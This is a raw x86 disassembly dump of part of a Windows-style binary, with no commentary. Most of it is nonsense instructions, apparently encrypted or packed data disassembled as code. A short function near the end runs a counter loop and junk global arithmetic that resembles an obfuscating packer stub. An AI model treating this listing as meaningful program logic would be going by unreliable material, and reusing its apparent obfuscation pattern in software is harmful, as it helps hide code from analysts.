  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xf5
  4030ce:	add    esp,0x7017fcfe
  4030d4:	jo     0x403094
  4030d6:	jle    0x403148
  4030d8:	jo     0x4030a5
  4030da:	shr    DWORD PTR ds:0xde9573e7,0xa8
  4030e1:	sahf   
  4030e2:	dec    ecx
  4030e3:	jg     0x4030e9
  4030e5:	(bad)  
  4030e6:	jno    0x403123
  4030e8:	out    dx,eax
  4030e9:	jl     0x403115
  4030eb:	cmp    ah,0x81
  4030ee:	add    esp,DWORD PTR [ebx]
  4030f0:	push   esi
  4030f1:	push   esi
  4030f2:	push   ds
  4030f3:	aad    0x73
  4030f5:	mov    WORD PTR [eax],ss
  4030f7:	mov    eax,ds:0xb07acb37
  4030fc:	xchg   edx,eax
  4030fd:	arpl   WORD PTR [edi],di
  4030ff:	jns    0x4030f8
  403101:	sbb    BYTE PTR [esp+ebp*2],bl
  403104:	mov    esi,0xdb384272
  403109:	into   
  40310a:	inc    edi
  40310b:	dec    edi
  40310c:	lea    edi,[ecx]
  40310e:	add    eax,DWORD PTR [eax]
  403110:	jecxz  0x403150
  403112:	les    eax,FWORD PTR [edx+0x3822dbd3]
  403118:	mov    WORD PTR [ebx],gs
  40311a:	xor    BYTE PTR [esi-0x69],bh
  40311d:	mov    ?,WORD PTR [eax-0x25]
  403120:	sub    bl,BYTE PTR [ebp+0x6e299616]
  403126:	not    dl
  403128:	in     al,0xfe
  40312a:	fistp  WORD PTR [esi-0x47b9ca05]
  403130:	pop    esp
  403131:	xchg   ebx,eax
  403132:	fisttp DWORD PTR [edi+edx*2+0x3a]
  403136:	inc    edx
  403137:	push   edi
  403138:	loopne 0x403119
  40313a:	ret    0xd496
  40313d:	add    ebx,DWORD PTR [eax-0x7d85581a]
  403143:	cmp    ecx,DWORD PTR [ebp-0x70]
  403146:	fistp  QWORD PTR [ebx]
  403148:	push   ss
  403149:	push   edi
  40314a:	lds    edx,FWORD PTR fs:[ebp-0x14bbaaf9]
  403151:	mov    ds:0x42a288eb,eax
  403156:	push   ds
  403157:	pop    ss
  403158:	or     eax,0x9ab4cff8
  40315d:	or     al,0x3b
  40315f:	and    eax,0x663c5818
  403164:	inc    ecx
  403165:	xchg   edx,eax
  403166:	cmp    bh,dl
  403168:	popf   
  403169:	mov    cl,BYTE PTR [ebx]
  40316b:	arpl   WORD PTR ds:0x97b8e245,sp
  403171:	jae    0x4031a3
  403173:	cdq    
  403174:	jb     0x403125
  403176:	mov    ebp,DWORD PTR [ecx+0x3be6fac7]
  40317c:	mov    al,ds:0x71a68133
  403181:	das    
  403182:	icebp  
  403183:	inc    eax
  403184:	inc    ebp
  403185:	stos   DWORD PTR es:[edi],eax
  403186:	test   BYTE PTR [ebx+ebp*8+0x65231304],dl
  40318d:	aaa    
  40318e:	sahf   
  40318f:	retf   
  403190:	mov    cl,0x90
  403192:	xor    al,0xee
  403194:	mov    BYTE PTR [ebp+0x7a7cf642],ah
  40319a:	jns    0x4031ec
  40319c:	lods   al,BYTE PTR ds:[esi]
  40319d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319e:	sbb    edx,ebp
  4031a0:	xor    edi,DWORD PTR [esi+0x65850c64]
  4031a6:	and    al,0x2b
  4031a8:	mov    dh,0x95
  4031aa:	in     eax,dx
  4031ab:	jbe    0x403200
  4031ad:	fild   QWORD PTR [ebp+0x37c3de5e]
  4031b3:	xor    ch,BYTE PTR [edx+0x343bdd3]
  4031b9:	dec    edi
  4031ba:	in     eax,0x77
  4031bc:	adc    al,0x29
  4031be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031bf:	or     eax,0x889058a7
  4031c4:	fwait
  4031c5:	pop    edx
  4031c6:	inc    ecx
  4031c7:	push   ss
  4031c8:	sub    eax,0xd38742b0
  4031cd:	xor    BYTE PTR [eax+0x7d],al
  4031d0:	lea    edi,[esi-0x61]
  4031d3:	xor    al,0xb0
  4031d5:	and    cl,0xc
  4031d8:	out    0x10,eax
  4031da:	and    eax,0xc3135933
  4031df:	dec    ebx
  4031e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e1:	jmp    0x998b:0x4f69326a
  4031e8:	jae    0x4031bb
  4031ea:	lea    eax,[esp+eiz*4-0x6c8f1b21]
  4031f1:	xchg   esp,eax
  4031f2:	add    eax,0xa747f0e9
  4031f7:	scas   eax,DWORD PTR es:[edi]
  4031f8:	aam    0x6c
  4031fa:	aas    
  4031fb:	std    
  4031fc:	sub    eax,0xbe79f4fa
  403201:	sub    ebx,ebx
  403203:	stc    
  403204:	xor    dh,cl
  403206:	fld    TBYTE PTR [ebx+eax*2]
  403209:	xchg   edi,eax
  40320a:	pop    esp
  40320b:	mov    eax,ds:0x1c689c9e
  403210:	in     eax,0x4e
  403212:	mov    edi,0xb6e49eeb
  403217:	add    eax,edx
  403219:	in     eax,0x92
  40321b:	nop
  40321c:	mov    edi,0xb0eb1e7d
  403221:	lds    ecx,FWORD PTR [ebx-0x5]
  403224:	mov    al,0xcd
  403226:	mov    dl,0x8c
  403228:	leave  
  403229:	pop    edx
  40322a:	or     DWORD PTR [edi+0x2228506b],ebp
  403230:	jmp    0x403205
  403232:	rcr    dh,0xe5
  403235:	fs adc al,0x74
  403238:	(bad)  
  403239:	dec    eax
  40323a:	dec    esp
  40323b:	mov    WORD PTR [edx-0xa],es
  40323e:	aad    0x18
  403240:	mov    eax,0xfe9b162a
  403245:	sti    
  403246:	jg     0x40325e
  403248:	bound  esi,QWORD PTR [ebp-0x1043eccf]
  40324e:	in     eax,dx
  40324f:	aaa    
  403250:	cmc    
  403251:	add    al,BYTE PTR [ecx]
  403253:	fmul   DWORD PTR [edx]
  403255:	or     eax,0x6963544a
  40325a:	out    0x97,al
  40325c:	mov    eax,0xe92fb284
  403261:	ja     0x4032a6
  403263:	call   0xe78656dc
  403268:	mov    bh,0x19
  40326a:	div    DWORD PTR [edx+0x28]
  40326d:	int3   
  40326e:	cmp    edi,edx
  403270:	fdivr  st(7),st
  403272:	or     esp,esp
  403274:	or     ebp,DWORD PTR [ecx]
  403276:	pushf  
  403277:	inc    esi
  403279:	aaa    
  40327a:	sub    DWORD PTR [ebp-0x19],edx
  40327d:	mov    esi,DWORD PTR [edi]
  40327f:	inc    ecx
  403280:	mov    dl,ah
  403282:	xlat   BYTE PTR ds:[ebx]
  403283:	and    esp,DWORD PTR [ecx-0x1f96f2d1]
  403289:	push   edx
  40328a:	mul    BYTE PTR [edx]
  40328c:	std    
  40328d:	adc    bl,bh
  40328f:	mov    edx,0xf132ac7e
  403294:	jae    0x403237
  403296:	fiadd  WORD PTR [edx]
  403298:	mov    cl,0xa8
  40329a:	sti    
  40329b:	fwait
  40329c:	adc    BYTE PTR [ebp-0x53],bh
  40329f:	(bad)  [edx-0x22765776]
  4032a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032a6:	stos   DWORD PTR es:[edi],eax
  4032a7:	xor    eax,0xa188bfc0
  4032ac:	aaa    
  4032ad:	std    
  4032ae:	sahf   
  4032af:	stos   BYTE PTR es:[edi],al
  4032b0:	cdq    
  4032b1:	sbb    bl,bh
  4032b3:	and    dl,BYTE PTR [eax+0x27]
  4032b6:	jl     0x403293
  4032b8:	int3   
  4032b9:	ss pusha 
  4032bb:	fsub   QWORD PTR [eax]
  4032bd:	xor    al,0xe3
  4032bf:	and    ecx,edi
  4032c1:	sub    ebx,DWORD PTR [eax]
  4032c3:	aam    0xe6
  4032c5:	add    ah,bl
  4032c7:	sbb    eax,0x7aa19c41
  4032cc:	add    ebp,DWORD PTR [edx+0x43543fdd]
  4032d2:	push   ecx
  4032d3:	jg     0x403276
  4032d5:	mov    cl,BYTE PTR [ebx-0x5ca4a100]
  4032db:	div    esi
  4032dd:	aad    0x84
  4032df:	xchg   ecx,eax
  4032e0:	mov    edx,0x1b255778
  4032e5:	dec    ecx
  4032e6:	rcr    BYTE PTR [ebx],1
  4032e8:	mov    edi,0x7c425b3b
  4032ed:	pop    ds
  4032ee:	add    al,0x52
  4032f0:	sbb    DWORD PTR [ebx+0x60],ebp
  4032f3:	cmp    al,0x73
  4032f5:	lds    eax,FWORD PTR [eax+0x38]
  4032f8:	fdivr  QWORD PTR [eax]
  4032fa:	cs fcmove st,st(7)
  4032fd:	lea    esi,[esi]
  4032ff:	push   edi
  403300:	mov    al,0x25
  403302:	cmp    ebp,DWORD PTR [edi-0x40]
  403305:	(bad)  
  403306:	sbb    al,0x52
  403308:	int3   
  403309:	neg    DWORD PTR [eax-0x6dab2cfc]
  40330f:	bound  esp,QWORD PTR [esi-0x522ba79c]
  403315:	ins    BYTE PTR es:[edi],dx
  403316:	and    bl,dl
  403318:	push   cs
  403319:	out    0x11,eax
  40331b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40331c:	pusha  
  40331d:	repnz movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  403320:	cmp    al,0x64
  403322:	stc    
  403323:	jmp    FWORD PTR ds:0xe0aa6df8
  403329:	mov    BYTE PTR [ebx+0xa9c3d8],dl
  40332f:	adc    DWORD PTR [ecx],ebx
  403331:	mov    ds:0xeb91d78,al
  403336:	or     DWORD PTR [edx+0x23],ecx
  403339:	jp     0x4032f5
  40333b:	mov    ebx,0x719b778a
  403340:	jmp    0x403395
  403342:	retf   
  403343:	add    eax,0x11968e3c
  403348:	add    BYTE PTR [eax],dl
  40334a:	clc    
  40334b:	(bad)  
  40334c:	call   0x14b90759
  403351:	mov    edx,0xdf7730c4
  403356:	mov    eax,edx
  403358:	mov    ch,0xcb
  40335a:	mov    ds:0x718bffcb,eax
  40335f:	iret   
  403360:	dec    esi
  403361:	or     cl,BYTE PTR [esi+0x1498175e]
  403367:	lock adc DWORD PTR [ecx+ebp*4+0x61],edi
  40336c:	add    BYTE PTR [edx-0x23],ch
  40336f:	cmp    DWORD PTR [eax+0x63],0x29
  403373:	mov    WORD PTR [eax],fs
  403375:	mov    ebx,0x9d97a53c
  40337a:	push   edi
  40337b:	test   eax,0xd8f7547b
  403380:	and    ch,BYTE PTR [edi]
  403382:	and    al,0x6a
  403384:	neg    BYTE PTR [edx+0x25eb6bf1]
  40338a:	mov    ah,0x5f
  40338c:	bswap  ebx
  40338e:	pop    ebp
  40338f:	pop    eax
  403390:	hlt    
  403391:	dec    ecx
  403392:	test   BYTE PTR [ecx],ch
  403394:	jno    0x403368
  403396:	push   ss
  403397:	add    BYTE PTR ds:0x758ba2cf,ch
  40339d:	or     BYTE PTR [edi],cl
  40339f:	scas   eax,DWORD PTR es:[edi]
  4033a0:	cli    
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	in     al,dx
  4033ba:	es and bl,dl
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x40341d
  4033c6:	repnz mov DWORD PTR [edx-0x281b8a67],eax
  4033cd:	xchg   esp,eax
  4033ce:	(bad)  
  4033cf:	jecxz  0x403387
  4033d1:	enter  0x5da4,0xa6
  4033d5:	jnp    0x403368
  4033d7:	mov    ch,0x4e
  4033d9:	add    cl,BYTE PTR ss:[ebp+0x34]
  4033dd:	push   esp
  4033de:	aas    
  4033df:	hlt    
  4033e0:	mov    ecx,esp
  4033e2:	push   esi
  4033e3:	in     al,0x6e
  4033e5:	and    esp,eax
  4033e7:	test   al,0x93
  4033e9:	and    eax,0xaaa8369e
  4033ee:	xor    DWORD PTR [ecx-0xa],0xffffffe5
  4033f2:	pop    edi
  4033f3:	(bad)  
  4033f5:	into   
  4033f6:	call   0x8c2a:0xce78a2c1
  4033fd:	push   ss
  4033fe:	ficom  WORD PTR [ebp+0x5d]
  403401:	push   ecx
  403402:	sbb    al,BYTE PTR [ebx]
  403404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403405:	pushf  
  403406:	mov    eax,ds:0xe77c1dbb
  40340b:	push   cs
  40340c:	pusha  
  40340d:	rol    BYTE PTR [edx+0x7a00d2a],1
  403413:	icebp  
  403414:	sbb    dl,bh
  403416:	je     0x403497
  403418:	cmp    BYTE PTR [esi+0x5ed4491a],ah
  40341e:	xchg   edx,eax
  40341f:	jmp    0x4033e3
  403421:	push   0x5e
  403423:	out    dx,eax
  403424:	jmp    0x403421
  403426:	mov    ch,0xd0
  403428:	inc    edi
  403429:	imul   edx,DWORD PTR [eax+0x71b7334b],0x66
  403430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403431:	dec    DWORD PTR [eax-0x3a]
  403434:	shl    BYTE PTR [ebp-0x263d9f8c],cl
  40343a:	nop
  40343b:	mov    al,ds:0x70577233
  403440:	push   cs
  403441:	jp     0x403400
  403443:	xlat   BYTE PTR ds:[ebx]
  403444:	les    ebx,FWORD PTR [eax]
  403446:	xchg   edx,eax
  403447:	nop
  403448:	jo     0x403437
  40344a:	ss mov eax,edi
  40344d:	fisubr WORD PTR [ebx-0x79a23508]
  403453:	out    0x4,eax
  403455:	sbb    eax,DWORD PTR [eax+0x33]
  403458:	inc    esp
  403459:	push   0x959f1601
  40345e:	mov    ebp,0x4beabd05
  403463:	push   0xffffff9d
  403465:	mov    dh,0xe5
  403467:	xchg   BYTE PTR [ecx],al
  403469:	(bad)  
  40346a:	cmp    BYTE PTR ds:0x4196130,ch
  403470:	mov    esp,0x8968a948
  403475:	es jg  0x403483
  403478:	mov    ebp,eax
  40347a:	int3   
  40347b:	pusha  
  40347c:	add    DWORD PTR [esi],0xc2939cc6
  403482:	pop    ebx
  403483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403484:	popa   
  403485:	xor    BYTE PTR [eax-0x2f],ah
  403488:	scas   eax,DWORD PTR es:[edi]
  403489:	xchg   ebx,eax
  40348a:	test   DWORD PTR [ecx-0x24b6f751],ecx
  403490:	mov    bh,0x7c
  403492:	mov    al,0x9d
  403494:	ins    DWORD PTR es:[edi],dx
  403495:	into   
  403496:	sbb    al,0xf5
  403498:	or     edi,DWORD PTR [edi+0x6a]
  40349b:	xor    DWORD PTR [esi],esp
  40349d:	xor    DWORD PTR [ebp+ebx*4-0x20],ebp
  4034a1:	outs   dx,BYTE PTR ds:[esi]
  4034a2:	push   ss
  4034a3:	mov    ds:0x7cad8a26,al
  4034a8:	fistp  DWORD PTR [edx+edi*4-0x43a562c8]
  4034af:	loope  0x403490
  4034b1:	pushf  
  4034b2:	daa    
  4034b3:	add    dh,BYTE PTR [ebp+0x1c]
  4034b6:	xchg   esp,eax
  4034b7:	adc    ah,bl
  4034b9:	pop    ebx
  4034ba:	inc    ebx
  4034bb:	push   esp
  4034bc:	fs popf 
  4034be:	nop
  4034bf:	sub    al,al
  4034c1:	jge    0x403526
  4034c3:	adc    DWORD PTR [ebx-0x1f6b5554],0x70c04d4c
  4034cd:	add    DWORD PTR [ebx+0x47],edx
  4034d0:	div    bh
  4034d2:	(bad)  
  4034d4:	dec    esi
  4034d5:	push   cs
  4034d6:	loopne 0x40351a
  4034d8:	scas   al,BYTE PTR es:[edi]
  4034d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034da:	and    ecx,DWORD PTR [edi]
  4034dc:	mov    dh,0x8f
  4034de:	jne    0x403555
  4034e0:	loope  0x4034aa
  4034e2:	dec    edx
  4034e3:	sbb    al,0x47
  4034e5:	ja     0x403476
  4034e7:	neg    BYTE PTR [ecx+0x29]
  4034ea:	ja     0x403533
  4034ec:	pushf  
  4034ed:	leave  
  4034ee:	ins    BYTE PTR es:[edi],dx
  4034ef:	stos   DWORD PTR es:[edi],eax
  4034f0:	mov    dh,0x26
  4034f2:	mov    ch,0x56
  4034f4:	imul   esp,DWORD PTR [eax+0x7d],0x75
  4034f8:	pop    esp
  4034f9:	pushf  
  4034fa:	and    DWORD PTR ds:0x2aa7be67,eax
  403500:	and    BYTE PTR [ecx-0x6d],al
  403503:	xchg   bh,cl
  403505:	push   edi
  403506:	ss pop ds
  403508:	mov    bl,0x18
  40350a:	sub    edx,DWORD PTR [ebp+edi*8+0x53]
  40350e:	cdq    
  40350f:	and    BYTE PTR ds:0x469c4bbe,al
  403515:	retf   
  403516:	ret    0xa788
  403519:	mov    esi,0xd776d335
  40351e:	ja     0x4034fa
  403520:	mov    ch,0x1d
  403522:	lahf   
  403523:	add    ebx,DWORD PTR [ebx]
  403525:	mov    ebp,0xf89c21c
  40352a:	xchg   esi,eax
  40352b:	cdq    
  40352c:	mov    ?,WORD PTR [edx+ecx*1+0x5c]
  403530:	jo     0x40358b
  403532:	outs   dx,BYTE PTR ds:[esi]
  403533:	inc    eax
  403534:	fidivr DWORD PTR [ecx]
  403536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403537:	inc    esp
  403538:	cwde   
  403539:	sar    BYTE PTR ds:0xee9f78c8,1
  40353f:	shl    BYTE PTR gs:0x777fa749,1
  403546:	push   ss
  403547:	das    
  403548:	fstp   DWORD PTR [eax+eiz*2-0x45]
  40354c:	pusha  
  40354d:	sbb    ah,BYTE PTR [ebp-0x44c02cfa]
  403553:	out    dx,al
  403554:	daa    
  403555:	and    BYTE PTR [edx-0x4b908a88],dh
  40355b:	push   es
  40355c:	xchg   ebp,eax
  40355d:	mov    DWORD PTR [edi+eiz*2+0x6e],ebp
  403561:	popf   
  403562:	test   eax,0x845db05e
  403567:	xor    eax,0x58394690
  40356c:	push   cs
  40356d:	xchg   BYTE PTR ds:0xe5d0ddf1,dh
  403573:	ret    
  403574:	jle    0x403532
  403576:	mov    BYTE PTR [ebx],0x1e
  403579:	adc    DWORD PTR [edi-0x3],esp
  40357c:	pusha  
  40357d:	hlt    
  40357e:	and    al,0x20
  403580:	imul   ecx,edi,0xfffffff4
  403583:	int    0xab
  403585:	popa   
  403586:	pop    es
  403587:	jge    0x40350e
  403589:	(bad)  
  40358a:	sti    
  40358b:	inc    ecx
  40358c:	adc    ah,bl
  40358e:	das    
  40358f:	xor    BYTE PTR [ebx-0x233e193f],ch
  403595:	mov    esi,DWORD PTR [ebp-0x3e6634cd]
  40359b:	push   0x93512508
  4035a0:	xor    eax,0x49aa34c1
  4035a5:	cmp    DWORD PTR [eax-0x23],ecx
  4035a8:	mov    bl,BYTE PTR [eax]
  4035aa:	xchg   BYTE PTR ds:0xccfb55f8,al
  4035b0:	pop    eax
  4035b1:	and    DWORD PTR [edi+edx*1+0xb6fa996],esi
  4035b8:	mov    es:0x35497012,al
  4035be:	clc    
  4035bf:	(bad)  
  4035c0:	mul    DWORD PTR ds:0xed94174c
  4035c6:	sbb    ebx,edi
  4035c8:	jg     0x403596
  4035ca:	out    dx,al
  4035cb:	mov    ebp,0xfe0a5fe
  4035d0:	cmp    edx,esi
  4035d2:	ficom  WORD PTR [edx-0x2fd9dcad]
  4035d8:	js     0x403597
  4035da:	add    eax,0x7f5c8d07
  4035df:	mov    eax,ds:0x9c124e70
  4035e4:	adc    eax,0x57636839
  4035e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ea:	mov    BYTE PTR [ebx],al
  4035ec:	clc    
  4035ed:	mov    esp,0x274da4f0
  4035f2:	sbb    BYTE PTR [ecx-0x5b],dh
  4035f5:	(bad)  
  4035f6:	cmp    BYTE PTR [edi],al
  4035f8:	sub    esi,esp
  4035fa:	sub    al,0x11
  4035fc:	sbb    edi,DWORD PTR [edx-0x59e74cdb]
  403602:	dec    edi
  403603:	lods   eax,DWORD PTR ds:[esi]
  403604:	mov    ah,0x41
  403606:	fs pop es
  403608:	fwait
  403609:	inc    edx
  40360a:	pop    ecx
  40360b:	(bad)  
  40360c:	fist   WORD PTR [edi+0x2c51f5d0]
  403612:	xchg   DWORD PTR [eax-0x3c],edx
  403615:	sbb    edi,DWORD PTR [eax+0x72]
  403618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403619:	jmp    0x2c7bc423
  40361e:	inc    esp
  40361f:	loope  0x4035fe
  403621:	cmp    ecx,edx
  403623:	enter  0xaca0,0x3f
  403627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403628:	popa   
  403629:	je     0x4036a9
  40362b:	xchg   DWORD PTR [edx],ebx
  40362d:	mov    bl,0x25
  40362f:	mov    ds,ecx
  403631:	retf   0xc9eb
  403634:	adc    eax,0x863a3176
  403639:	xchg   ebx,eax
  40363a:	jbe    0x4035bf
  40363c:	dec    edi
  40363d:	dec    ecx
  40363e:	add    al,0x6d
  403640:	addr16 add eax,0xd2ba89f6
  403646:	jle    0x4036b6
  403648:	jp     0x403604
  40364a:	dec    eax
  40364b:	mov    WORD PTR [esi],cs
  40364d:	fisttp QWORD PTR [ebx]
  40364f:	clc    
  403650:	pop    esi
  403651:	shl    BYTE PTR [edx],1
  403653:	and    esi,DWORD PTR [edi+0x31db1b9a]
  403659:	jae    0x4035ec
  40365b:	push   ebx
  40365c:	xor    dl,bh
  40365e:	xchg   ecx,eax
  40365f:	imul   edi,DWORD PTR [edx-0x20],0x93d4ab54
  403666:	sub    eax,0xda169dc5
  40366b:	dec    edi
  40366c:	ret    0xed5
  40366f:	call   ebp
  403671:	shl    DWORD PTR ds:0xf1c3254a,cl
  403677:	mov    al,ds:0xdfb281a4
  40367c:	jns    0x4036a5
  40367e:	outs   dx,DWORD PTR ds:[esi]
  40367f:	xchg   esi,eax
  403680:	pop    edx
  403681:	push   es
  403682:	jnp    0x403607
  403684:	outs   dx,DWORD PTR ds:[esi]
  403685:	xchg   ebx,eax
  403686:	loope  0x403612
  403688:	test   BYTE PTR [ebx],al
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fded,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fded,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fded,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e3d7
  4036fc:	cmp    DWORD PTR ds:0x42fded,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fded
  403711:	dec    eax
  403712:	mov    ds:0x42fded,eax
  403717:	mov    eax,ds:0x42fded
  40371c:	dec    eax
  40371d:	mov    ds:0x42fded,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e7f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e7f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fe0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e813,0x42e21c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fe7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e224,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e80f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    ebx,edx
  4037a2:	js     0x40379c
  4037a4:	(bad)  
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xf670707d
  4037ae:	dec    edx
  4037af:	cmp    BYTE PTR [eax-0x9],dh
  4037b2:	sub    al,0x92
  4037b4:	xor    ah,bh
  4037b6:	mov    eax,0x3a25f68f
  4037bb:	es mov ebp,0xc5619cef
  4037c1:	mov    BYTE PTR [edx],bl
  4037c3:	daa    
  4037c4:	add    ebx,DWORD PTR [eax-0x78]
  4037c7:	jge    0x40378c
  4037c9:	outs   dx,BYTE PTR ds:[esi]
  4037ca:	add    ebp,esi
  4037cc:	fidivr WORD PTR [eax+ebp*2]
  4037cf:	push   ss
  4037d0:	in     al,dx
  4037d1:	fs gs push ss
  4037d4:	jmp    0x40378a
  4037d6:	popa   
  4037d7:	in     al,dx
  4037d8:	(bad)  
  4037d9:	int3   
  4037da:	cmc    
  4037db:	cmp    bh,BYTE PTR [eax-0x1fd0eb5c]
  4037e1:	dec    edx
  4037e2:	pushf  
  4037e3:	add    al,0x13
  4037e5:	xchg   DWORD PTR [edi-0x44],edi
  4037e8:	inc    ecx
  4037e9:	outs   dx,DWORD PTR ds:[esi]
  4037ea:	mov    esi,0xf2f9b8c8
  4037ef:	xlat   BYTE PTR gs:[ebx]
  4037f1:	call   0x210d52a3
  4037f6:	retf   0xb8ea
  4037f9:	mov    ds:0xd7ae47cf,eax
  4037fe:	and    DWORD PTR [ebx],0x1ce02568
  403804:	lods   al,BYTE PTR ds:[esi]
  403805:	pop    ebp
  403806:	aaa    
  403807:	and    eax,DWORD PTR [ebp-0x3409365]
  40380d:	xor    al,0x5c
  40380f:	retf   
  403810:	mov    al,ds:0xa741d159
  403815:	popa   
  403816:	out    0xa8,eax
  403818:	je     0x403853
  40381a:	mov    DWORD PTR [edx],0x35359e94
  403820:	push   ebx
  403821:	fst    QWORD PTR [edi]
  403823:	push   edx
  403824:	rol    DWORD PTR [esi-0x75],cl
  403827:	push   ds
  403828:	dec    ebx
  403829:	lods   eax,DWORD PTR ds:[esi]
  40382a:	(bad)  
  40382c:	enter  0x4a67,0xad
  403830:	(bad)  
  403831:	data16 sub BYTE PTR [edx+0x21],ah
  403835:	inc    ecx
  403836:	mov    ebx,0x1f638ff6
  40383b:	repnz data16 and ah,BYTE PTR ss:[edi+esi*1+0x3aeb0da5]
  403845:	push   edx
  403846:	and    eax,0x20d2e924
  40384b:	pop    esi
  40384c:	xchg   edx,eax
  40384d:	call   0xe382540f
  403852:	xchg   ecx,eax
  403853:	adc    ah,ah
  403855:	in     eax,dx
  403856:	pop    esp
  403857:	jmp    0x1e72174b
  40385c:	jl     0x403878
  40385e:	mov    ds,WORD PTR [edx+eax*8-0x55]
  403862:	ja     0x403856
  403864:	retf   
  403865:	(bad)  
  403867:	add    bl,0x70
  40386a:	(bad)  
  40386b:	js     0x4038d5
  40386d:	pop    eax
  40386e:	and    ah,cl
  403870:	jo     0x4037fc
  403872:	nop
  403873:	and    BYTE PTR [esi],0xdd
  403876:	retf   
  403877:	int    0xef
  403879:	ret    
  40387a:	enterw 0x80c9,0x39
  40387f:	or     eax,0xab6959f1
  403884:	ds nop
  403886:	fwait
  403887:	cmp    BYTE PTR [bp+si-0x74],cl
  40388b:	sbb    BYTE PTR [eax-0x8],dh
  40388e:	jl     0x4038bd
  403890:	test   al,0x25
  403892:	clc    
  403893:	loope  0x403865
  403895:	jnp    0x4038f3
  403897:	je     0x40385d
  403899:	pop    ds
  40389a:	jmp    FWORD PTR [edi+0x52]
  40389d:	dec    ebx
  40389e:	inc    esi
  40389f:	add    ebx,esi
  4038a1:	daa    
  4038a2:	lods   eax,DWORD PTR ds:[esi]
  4038a3:	ins    DWORD PTR es:[edi],dx
  4038a4:	dec    eax
  4038a5:	ror    DWORD PTR [edx-0x39],0x68
  4038a9:	xchg   ebp,eax
  4038aa:	jno    0x403846
  4038ac:	sbb    DWORD PTR [eax+0x6c],ebx
  4038af:	sar    BYTE PTR [ebp-0x46deb32],cl
  4038b5:	xchg   esi,eax
  4038b6:	rcl    BYTE PTR [esi+0xad5377a],cl
  4038bc:	jecxz  0x403883
  4038be:	and    BYTE PTR ds:0x1f1c71b8,0x53
  4038c6:	dec    esp
  4038c7:	sahf   
  4038c8:	mov    ebp,0x3087905d
  4038cd:	dec    edi
  4038ce:	outs   dx,BYTE PTR ds:[esi]
  4038cf:	icebp  
  4038d0:	pop    edx
  4038d1:	pop    edx
  4038d2:	in     al,dx
  4038d3:	jp     0x40388d
  4038d5:	out    dx,eax
  4038d6:	fs fwait
  4038d8:	cmp    BYTE PTR [edx],ch
  4038da:	nop
  4038db:	inc    ebx
  4038dc:	jge    0x40391e
  4038de:	scas   eax,DWORD PTR es:[edi]
  4038df:	jmp    0x403933
  4038e1:	xor    BYTE PTR [edx-0x7da3563],bl
  4038e7:	stos   BYTE PTR es:[edi],al
  4038e8:	push   esi
  4038e9:	xchg   edi,eax
  4038ea:	scas   eax,DWORD PTR es:[edi]
  4038eb:	jbe    0x403928
